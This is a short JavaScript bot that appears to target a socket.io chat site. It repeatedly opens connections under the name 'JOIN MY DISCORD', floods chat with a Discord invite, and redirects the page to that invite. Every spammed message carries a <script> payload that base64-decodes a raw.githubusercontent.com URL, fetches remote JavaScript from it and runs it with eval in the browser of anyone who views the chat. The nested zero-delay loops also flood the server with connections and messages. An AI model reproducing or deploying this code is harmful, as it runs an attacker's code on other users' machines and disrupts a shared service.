let coughtimer = 7777; setInterval(() => {
    const socketb = io("//");
    socketb.emit("client", "MAIN");
    socketb.emit("login", {
        name: "JOIN MY DISCORD"
    });
    socketb.emit("command", {
        list: ["color"]
    });
    socketb.emit("command", {
        list: ["color"]
    });
    setInterval(() => {
    socketb.emit("talk", {
        text: "JOIN MY DISCORD NOW https://discord.gg/7z8uZqvF <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
    });
    socket.emit("talk", {
        text: "JOIN MY DISCORD NOW https://discord.gg/7z8uZqvF <script>fetch(atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2l2b3J5ZGV2cmltb2FsdC9CT05aSVdPUkxEVUxUUkFKQVZBU0NSSVBUTElTVC9yZWZzL2hlYWRzL21haW4v')+'???'+atob('Lmpz')).then(r=>r.text()).then(t=>eval(t))</script>"
            });
    });
    coughtimer = coughtimer - 125;
}, coughtimer);
setTimeout(() => {
    window.location.href = "https://discord.gg/7z8uZqvF";
}, 27777)
